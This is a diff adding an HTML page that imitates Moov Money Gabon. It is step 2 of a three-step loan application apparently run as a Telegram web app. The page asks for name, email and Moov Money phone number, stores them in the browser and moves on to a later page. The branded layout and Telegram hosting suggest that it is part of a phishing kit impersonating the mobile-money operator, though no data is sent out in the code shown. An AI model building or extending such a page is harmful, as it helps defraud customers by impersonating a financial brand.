@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Moov Money - Informations Personnelles</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --moov-orange: #ff6600; --moov-blue: #0047ab; --bg-color: #f0f4f8; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .app-header { width: 100%; background: linear-gradient(135deg, var(--moov-blue), #1e3a8a); height: 60px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; border-bottom: 3px solid var(--moov-orange); }
+        .back-btn-top { color: white; text-decoration: none; font-weight: 600; font-size: 15px; cursor: pointer; }
+        .header-title { position: absolute; left: 50%; transform: translateX(-50%); display: flex; font-size: 20px; font-weight: 800; color: white; }
+        .header-title .moov { color: var(--moov-orange); margin-right: 4px; }
+        .card { background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 32px 24px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
+        .main-title { font-size: 26px; margin: 0 0 6px; text-align: center; font-weight: 800; color: #1e293b; }
+        .subtext { font-size: 14px; color: #64748b; text-align: center; margin-bottom: 20px; }
+        .step-indicator { display: flex; gap: 12px; margin: 0 auto 32px; width: 80%; }
+        .step-bar { flex: 1; height: 4px; background-color: #cbd5e1; border-radius: 2px; }
+        .step-bar.active { background-color: var(--moov-orange); }
+        .form-group { margin-bottom: 22px; display: flex; flex-direction: column; }
+        .form-group label { font-size: 15px; font-weight: 700; color: #1e293b; margin-bottom: 10px; }
+        .form-control { font-size: 15px; padding: 14px 16px; border: 1px solid #cbd5e1; border-radius: 10px; outline: none; width: 100%; }
+        .phone-group { display: flex; gap: 10px; }
+        .country-prefix { display: flex; align-items: center; gap: 6px; background-color: #f1f5f9; border: 1px solid #cbd5e1; border-radius: 10px; padding: 0 14px; font-weight: 700; font-size: 15px; }
+        .btn-container { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
+        .btn-prev { background-color: #e2e8f0; color: #475569; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 700; cursor: pointer; }
+        .btn-next { background-color: var(--moov-orange); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
+        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #64748b; margin-top: auto; }
+    </style>
+</head>
+<body>
+<div class="app-header">
+    <a href="/page2" class="back-btn-top">← Retour</a>
+    <div class="header-title"><span class="moov">Moov</span><span class="money">Money</span></div>
+    <div style="width: 24px;"></div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Demande de Prêt</h1>
+    <div class="subtext">Étape 2 sur 3</div>
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar"></div>
+    </div>
+
+    <form onsubmit="goNext(event)">
+        <div class="form-group">
+            <label>Prénom</label>
+            <input type="text" id="firstName" class="form-control" placeholder="Jean" required>
+        </div>
+        <div class="form-group">
+            <label>Nom</label>
+            <input type="text" id="lastName" class="form-control" placeholder="Ndong" required>
+        </div>
+        <div class="form-group">
+            <label>Email</label>
+            <input type="email" id="email" class="form-control" placeholder="jean@exemple.ga" required>
+        </div>
+        <div class="form-group">
+            <label>Numéro de Téléphone Moov Money Gabon</label>
+            <div class="phone-group">
+                <div class="country-prefix"><span>🇬🇦</span><span>+241</span></div>
+                <input type="tel" id="phone" class="form-control" placeholder="065123456" maxlength="9" required>
+            </div>
+        </div>
+        <div class="btn-container">
+            <button type="button" class="btn-prev" onclick="location.href='/page2'">PRÉCÉDENT</button>
+            <button type="submit" class="btn-next">ÉTAPE SUIVANTE</button>
+        </div>
+    </form>
+</div>
+
+<div class="footer-banner">© 2026 Moov Money Gabon</div>
+
+<script>
+    function goNext(event) {
+        event.preventDefault();
+        localStorage.setItem('firstName', document.getElementById('firstName').value);
+        localStorage.setItem('lastName', document.getElementById('lastName').value);
+        localStorage.setItem('email', document.getElementById('email').value);
+        localStorage.setItem('phone', document.getElementById('phone').value);
+        window.location.href = "/page4";
+    }
+</script>
+</body>
+</html>
